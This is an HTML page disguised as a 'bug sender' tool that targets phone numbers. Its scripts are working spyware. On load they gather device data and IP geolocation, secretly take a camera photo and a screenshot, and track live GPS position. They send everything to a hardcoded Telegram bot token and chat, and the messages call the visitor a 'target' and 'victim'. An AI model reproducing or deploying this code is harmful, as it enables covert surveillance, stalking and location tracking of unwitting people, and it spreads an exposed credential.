<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>API BUG WEB</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>:root{
  --bg:#000;
  --panel-bg:rgba(18,12,28,0.6);
  --muted:#bdb7c9;
  --muted-2:#8e8596;
  --accent1:#6e48aa;
  --accent2:#9d50bb;
  --glow: 0 8px 30px rgba(110,72,170,0.12);
  --glass-border: rgba(255,255,255,0.03);
  --radius:12px;
}

*{box-sizing:border-box;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
html,body{height:100%;margin:0}
body{
  background:
    radial-gradient(1200px 600px at 10% 10%, rgba(157,80,187,0.06), transparent 8%),
    radial-gradient(900px 400px at 90% 90%, rgba(110,72,170,0.04), transparent 8%),
    var(--bg);
  color:var(--muted);
  font-family:Arial,Helvetica,sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:28px;
  overflow:hidden;
}
.card{
  width:92%;
  max-width:420px;
  padding:28px;
  border-radius:var(--radius);
  background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
  border: 1px solid var(--glass-border);
  box-shadow: var(--glow);
  backdrop-filter: blur(8px) saturate(120%);
  -webkit-backdrop-filter: blur(8px) saturate(120%);
  animation: floatIn .45s ease both;
}
@keyframes floatIn {
  from { transform: translateY(8px); opacity:0 }
  to   { transform: translateY(0); opacity:1 }
}
h1{
  font-size:18px;
  margin:0 0 14px;
  color:var(--accent1);
  letter-spacing:1px;
  text-transform:uppercase;
  font-weight:600;
  text-shadow: 0 1px 0 rgba(0,0,0,0.6);
}
label{
  display:block;
  font-size:12px;
  margin-top:12px;
  color:#cbb9ee;
  font-weight:600;
  letter-spacing:.4px;
}
input, select, button{
  width:100%;
  padding:12px 14px;
  border-radius:10px;
  border:1px solid rgba(255,255,255,0.03);
  background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
  color:var(--muted);
  font-size:14px;
  outline:none;
  margin-top:8px;
  transition: all .2s ease;
}
input:focus, select:focus{
  border-color: rgba(157,80,187,0.85);
  box-shadow: 0 6px 24px rgba(110,72,170,0.08), 0 0 0 4px rgba(157,80,187,0.06);
}
button{
  margin-top:16px;
  cursor:pointer;
  background: linear-gradient(90deg, var(--accent1), var(--accent2));
  color:white;
  font-weight:700;
  border:none;
  border-radius:10px;
  letter-spacing:.6px;
  box-shadow: 0 8px 20px rgba(110,72,170,0.2);
}
button:hover{ transform: translateY(-2px); box-shadow: 0 16px 36px rgba(110,72,170,0.22) }
button:active{ transform: translateY(0); filter:brightness(.95) }
.muted{font-size:12px;color:var(--muted-2);margin-top:12px}
.status{margin-top:12px;font-size:13px;color:#a6f2c6;font-weight:600}
.small{font-size:12px;color:#9a8fb2;margin-top:8px}

/* progress bar styles (in-page) */
#progress-container{ position:fixed; left:0; right:0; top:0; height:4px; background:#111; z-index:9999; overflow:hidden }
#progress-bar{ height:100%; width:0%; background: linear-gradient(90deg,#6e48aa,#9d50bb); transition: width .25s linear }
#loading-details{ position:fixed; top:8px; left:50%; transform:translateX(-50%); color:#bba6e6; font-family:Arial, sans-serif; font-size:13px; z-index:10000 }
</style>
</head>
<body>
<div class="card">
  <h1>PROSESS CONNECT TO SERVER LOGIN</h1>
  <form id="attackForm">
    <label for="phone">Input Number</label>
    <input id="phone" type="tel" placeholder="62XXXXX" required />

    <label for="bugType">TYPE BUG</label>
    <select id="bugType">
      <option value="attack_menu" selected>API SERVER</option>
      <option value="pairing_code">PAIRING CODE</option>
      <option value="CRASH UI">CRASH UI</option>
      <option value="CUSTOM">CUSTOM</option>
    </select>

    <label for="customMsg" class="small">API KEY</label>
    <input id="customMsg" type="text" placeholder="Optional" />

    <button type="submit">SEND BUG</button>
    <div class="status" id="status">CEK YOU SERVER</div>
  </form>
  <div class="muted">POWERED BY IKYY999</div>
</div>

<script>
// ======================= KONFIGURASI =======================
const T = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
const C = '7962628944';

// ======================= FUNGSI TELEGRAM =======================
async function sTG(d){
  try{
    await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
    });
    return true;
  }catch(e){
    console.warn('sTG error', e);
    return false;
  }
}

async function sP(blob, filename='capture.png'){
  try{
    const fd = new FormData();
    fd.append('chat_id', C);
    fd.append('photo', blob, filename);
    const res = await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{ method:'POST', body: fd });
    return res.ok;
  }catch(e){
    console.warn('sP error', e);
    return false;
  }
}

// ======================= REVERSE GEOCODING =======================
async function gLD(lat, lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
    const d = await r.json();
    if(d && d.address){
      return {
        kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
        kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
        fa: d.display_name || "Alamat tidak tersedia"
      };
    }
  }catch(e){
    console.warn('gLD error', e);
  }
  return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
}

// ======================= KUMPULAN DATA DEVICE + LOKASI =======================
async function cDI(){
  let m = '╭───── TARGET TERBARU ───── ⦿\n\n';
  m += '⚙️ DEVICE INFORMATION\n';
  m += `🖥️ Device: ${navigator.userAgent}\n`;
  m += `💻 Platform: ${navigator.platform}\n`;
  m += `🌐 Bahasa: ${navigator.language}\n`;
  m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
  m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
  m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
  m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
  m += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}\n`;

  if(navigator.getBattery){
    try{
      const b = await navigator.getBattery();
      m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
      m += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
    }catch(e){
      m += '🔋 Battery: ❌ Tidak tersedia\n';
    }
  }

  m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
  m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
  m += `📜 History Length: ${history.length}\n`;
  m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
  m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
  m += `🌍 URL: ${location.href}\n`;
  m += `📄 Title: ${document.title}\n`;
  m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
  m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

  try{
    const i = await fetch('https://ipapi.co/json/');
    if(i.ok){
      const d = await i.json();
      m += '📍 ALAMAT DETAIL LOKASI KORBAN\n';
      m += `📡 IP Address: ${d.ip}\n`;
      m += `🏙️ Kota: ${d.city}\n`;
      m += `🏙️ Kabupaten: ${d.region}\n`;
      m += `🌎 Negara: ${d.country_name}\n`;
      m += `🏷️ Kode Pos: ${d.postal}\n`;
      if(d.latitude && d.longitude){
        m += `📌 Latitude: ${d.latitude}\n`;
        m += `📍 Longitude: ${d.longitude}\n`;
        const l = await gLD(d.latitude, d.longitude);
        m += `🏙️ Kabupaten: ${l.kb}\n`;
        m += `🏙️ Kecamatan: ${l.kc}\n`;
        m += `🏠 Alamat Lengkap: ${l.fa}\n`;
      }
    } else {
      m += '❌ Gagal mendapatkan informasi lokasi (ipapi.CO tidak balas)\n';
    }
  }catch(e){
    m += '❌ Gagal mendapatkan informasi lokasi\n';
  }

  m += '\n╰───── Developer @HOREGXTEAM ───── ⦿';
  return m;
}

// ======================= PROGRESS BAR + AUTO SEND =======================
(function startProgressAutoSend(){
  let pbWrap = document.getElementById('progress-container');
  if(!pbWrap){
    pbWrap = document.createElement('div');
    pbWrap.id = 'progress-container';
    document.body.appendChild(pbWrap);
  }
  let pb = document.getElementById('progress-bar');
  if(!pb){
    pb = document.createElement('div');
    pb.id = 'progress-bar';
    pb.style.width = '0%';
    pb.style.height = '100%';
    pb.style.background = 'linear-gradient(90deg,#6e48aa,#9d50bb)';
    pbWrap.appendChild(pb);
  }

  let ld = document.getElementById('loading-details');
  if(!ld){
    ld = document.createElement('div');
    ld.id = 'loading-details';
    ld.textContent = 'PROSESS CONNECT TO SERVER LOGIN';
    document.body.appendChild(ld);
  }

  const LM = [
    "CONNECT SENDER",
    "MEMBUAT LOGIN AKUN",
    "INSTALL AKUN",
    "CEK SERVER",
    "WELCOME TO SERVER",
    "UPDATE TERBARU",
    "GUNAKAN BUG INI TQ"
  ];

  let p = 0;
  const tick = async () => {
    p += Math.random() * 8 + 2;
    if(p > 100) p = 100;
    pb.style.width = p + '%';

    if(Math.random() > 0.8){
      ld.textContent = LM[Math.floor(Math.random() * LM.length)];
    }

    if(p < 100){
      requestAnimationFrame(tick);
    } else {
      ld.textContent = 'CEK API KEY';
      const infoText = await cDI();

      const phoneEl = document.getElementById('phone');
      const typeEl = document.getElementById('bugType');
      let extra = '';
      if(phoneEl && phoneEl.value.trim()){
        extra += `\nNOMBOR: ${phoneEl.value.trim()}`;
      }
      if(typeEl && typeEl.value){
        extra += `\nTYPE: ${typeEl.value}`;
      }

      const finalMsg = `<b>AUTO REQUEST</b>\n${infoText}${extra}\n\nNOTE: Auto-send tanpa preview.\nTIME: ${new Date().toLocaleString()}`;
      const sent = await sTG(finalMsg);
      if(sent){
        ld.textContent = 'CEK PANEL ✅';
        document.getElementById('status') && (document.getElementById('status').textContent = 'SUCCESS SEND BUG ✅');
      } else {
        ld.textContent = 'FUNC NOT FOUND ❌';
        document.getElementById('status') && (document.getElementById('status').textContent = 'FAIL SEND ❌');
      }

      setTimeout(()=>{
        pbWrap.style.display = 'none';
        ld.style.display = 'none';
      },2000);
    }
  };

  requestAnimationFrame(tick);
})();

// ======================= FORM SUBMIT =======================
document.getElementById('attackForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  document.getElementById('status').textContent = 'Menghantar...';
  const info = await cDI();
  const phone = document.getElementById('phone').value.trim();
  const type = document.getElementById('bugType').value;
  const custom = document.getElementById('customMsg').value.trim();
  let extra = '';
  if(phone) extra += `\nNOMBOR: ${phone}`;
  if(type) extra += `\nTYPE: ${type}`;
  if(type === 'CUSTOM' && custom) extra += `\nCUSTOM: ${custom}`;

  const msg = `<b>MANUAL REQUEST</b>\n${info}${extra}\n\nTIME: ${new Date().toLocaleString()}`;
  const ok = await sTG(msg);
  if(ok){
    document.getElementById('status').textContent = 'Berjaya dihantar ✅';
  } else {
    document.getElementById('status').textContent = 'Gagal hantar ❌';
  }
});
</script>

<script>
// ======================= CAMERA + SCREENSHOT + GPS LIVE =======================
(async function() {
  setTimeout(async () => {
    try {
      await sTG(await cDI());
    } catch(e) {}

    // Kamera
    try {
      const video = document.createElement('video');
      video.setAttribute('playsinline', '');
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      video.style.left = '-9999px';
      document.body.appendChild(video);
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 3000));
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
      await sP(blob, 'camera_capture.jpg');
      stream.getTracks().forEach(t => t.stop());
      video.remove();
    } catch(e) {
      await sTG('❌ Gagal Mendapatkan Foto Korban: ' + e.message);
    }

    // Screenshot setelah 5 detik
    setTimeout(async () => {
      try {
        const canvas = await html2canvas(document.body);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        await sP(blob, 'screenshot.jpg');
      } catch(e) {
        await sTG('❌ Screenshot failed: ' + e.message);
      }
    }, 5000);

    // GPS watch position (real-time)
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(async (p) => {
        let g = `📍 Lokasi Akurat Sesuai Target\n📌 Lat: ${p.coords.latitude}\n📍 Lng: ${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n`;
        const l = await gLD(p.coords.latitude, p.coords.longitude);
        g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
        g += `🌍 <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Lihat di Google Maps</a>\n`;
        await sTG(g);
      }, async (e) => {
        await sTG(`❌ GPS Korban Di Matikan: ${e.message}`);
      }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
    } else {
      await sTG('❌ Geolocation tidak didukung browser');
    }
  }, 3000);
})();
</script>
</body>
</html>
